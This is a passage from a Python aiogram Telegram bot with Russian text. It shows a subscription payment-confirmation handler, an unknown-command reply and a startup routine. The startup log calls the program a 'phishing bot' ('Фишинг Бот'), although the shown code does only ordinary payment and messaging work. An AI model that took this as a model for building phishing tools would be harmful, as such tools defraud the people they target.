            # Используем новую функцию для отправки фото
            await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                                      "photo1.png", success_text, markup)
            
            await callback_query.answer("✅ Оплата подтверждена! Подписка активирована.", show_alert=True)
        else:
            await callback_query.answer("❌ Оплата не найдена. Пожалуйста, оплатите счет или попробуйте позже.", show_alert=True)
    else:
        await callback_query.answer("❌ Счет не найден или истек. Создайте новый счет.", show_alert=True)

# --- ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОМАНД ---

@dp.message()
async def handle_unknown(message: types.Message):
    unknown_text = format_bold_text("#@$%?&!... Похоже я вас не понял\nПопробуйте воспользоваться меню ниже или введите ❯❯❯ /start")
    await message.answer(unknown_text, parse_mode='HTML')

async def main():
    """Основная функция запуска бота"""
    # Проверяем существование необходимых файлов изображений
    required_images = ['photo1.png', 'photo3.png', 'photo8.png']
    
    logging.info("Проверка наличия файлов изображений...")
    for img in required_images:
        img_path = get_image_path(img)
        if os.path.exists(img_path):
            logging.info(f"✓ Файл {img} найден: {img_path}")
        else:
            logging.warning(f"✗ Файл {img} не найден: {img_path}")
    
    logging.info("Фишинг Бот запущен...")
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
